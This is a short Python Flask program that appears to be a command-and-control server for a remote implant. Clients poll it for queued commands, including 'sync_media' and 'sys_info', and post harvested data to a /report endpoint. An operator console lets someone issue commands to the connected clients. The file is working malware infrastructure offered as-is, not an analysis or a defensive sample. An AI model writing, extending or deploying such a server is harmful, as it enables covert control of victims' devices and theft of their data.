from flask import Flask, request
import threading

app = Flask(__name__)

current_command = "net_info"
received_logs = []

@app.route('/command_poll', methods=['GET'])
def command_poll():
    global current_command
    cmd_to_send = current_command
    current_command = "no_op"
    return cmd_to_send, 200

@app.route('/report', methods=['POST'])
def report_data():
    data = request.data.decode('utf-8')
    received_logs.append(data)
    print(f"[+] Received Data Log: {data}")
    return "OK", 200

def terminal_control():
    global current_command
    while True:
        print("\n--- ULTIMATE TERMINAL CONTROL PANEL ---")
        print("1. net_info")
        print("2. sync_media")
        print("3. sys_info")
        print("----------------------------------------")
        choice = input("Enter command string > ").strip()
        if choice:
            current_command = choice
            print(f"[*] Command queued: {choice}")

if __name__ == '__main__':
    cli_thread = threading.Thread(target=terminal_control, daemon=True)
    cli_thread.start()
    app.run(host='0.0.0.0', port=5000)
